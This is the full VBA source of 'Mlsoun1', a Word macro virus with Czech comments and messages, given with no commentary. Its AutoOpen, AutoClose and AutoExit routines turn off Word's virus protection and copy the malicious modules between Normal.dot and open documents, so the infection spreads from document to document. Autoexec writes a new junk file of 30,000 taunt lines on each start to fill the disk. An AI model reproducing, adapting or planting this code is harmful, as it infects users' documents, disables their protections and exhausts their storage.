   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Mlsoun1"
   Sub Autoexec()
   'jsem&ml$oun2
   'for template
   Dim pocitadlo As Integer
   On Error GoTo errs
       Options.VirusProtection = False
       ChDir (Application.Path)
       filecount = CurDir + "\count.dll"
       Open filecount For Binary As #1
       Get #1, 1, pocitadlo
       pocitadlo = pocitadlo + 1
       Put #1, 1, pocitadlo
       Close #1
       soubor = Application.Path & "\" & "off" & pocitadlo & ".dll"
       Open soubor For Output As #2
       retezec = "Jsem Mlsoun1, a mam rad Vas harddisk, radeji si poridte velmi maly, at mne lepe najdete!"
       Do While Not delk = 30000
           Print #2, retezec
           delk = delk + 1
       Loop
       Close #2
   Exit Sub
   errs:
       Select Case Err.Number
           Case 61
               c = MsgBox("Nedostatek mista na disku!Toto zpusobil virus MLSOUN!", vbExclamation)
           Case Else
       End Select
   End Sub
   Sub AutoClose()
   'from template to file
   On Error GoTo errs
       docu = Application.ActiveDocument.Name
       If dok = "Normal.dot" Then Exit Sub
       docupath = Application.ActiveDocument.Path + "\" + docu
       templname = Application.NormalTemplate.Name
       templpath = Application.NormalTemplate.Path + "\" + templname
       Application.OrganizerCopy Source:= _
       templpath, Destination:= _
       docupath, Name:="Mlsoun1", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:= _
       templpath, Destination:= _
       docupath, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
   errs:
       Select Case Err.Number
           Case 5940
           Case 4248
           Case 4198
           Case 4149
           Case 0
           Case Else
       End Select
   End Sub
   Sub AutoExit()
   'from template to file
   On Error GoTo errs
       'Application.ActiveDocument.Save
       docu = Application.ActiveDocument.Name
       If dok = "Normal.dot" Then Exit Sub
       docupath = Application.ActiveDocument.Path + "\" + docu
       templname = Application.NormalTemplate.Name
       templpath = Application.NormalTemplate.Path + "\" + templname
       Application.OrganizerCopy Source:= _
       templpath, Destination:= _
       docupath, Name:="Mlsoun1", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:= _
       templpath, Destination:= _
       docupath, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
   errs:
       Select Case Err.Number
           Case 5940
           Case 4248
           Case 4198
           Case 4149
           Case 0
           Case Else
       End Select
   End Sub

   Attribute VB_Name = "AutoOpen"
   Sub MAIN()
   'jsem&ml$oun2
   'from file to template
   On Error GoTo errs
       Options.VirusProtection = False
       docu = Application.ActiveDocument.Name
       docupath = Application.ActiveDocument.Path + "\" + docu
       ChDir (Application.NormalTemplate.Path)
       activedir = CurDir + "\Normal.dot"
       Application.OrganizerCopy Source:= _
       docupath, Destination:= _
       activedir, Name:="Mlsoun1", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:= _
       docupath, Destination:= _
       activedir, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
       Exit Sub
   errs:
       Select Case Err.Number
           Case 5940   'polozku projektu nelze zkopirovat
           Case 61
               c = MsgBox("Na disku není dostatek místa. Uvolnìte místo smazáním nìkolika souborù!", vbExclamation + vbOKOnly)
           Application.ActiveWindow.Close (False)
           Case Else
       End Select
   End Sub
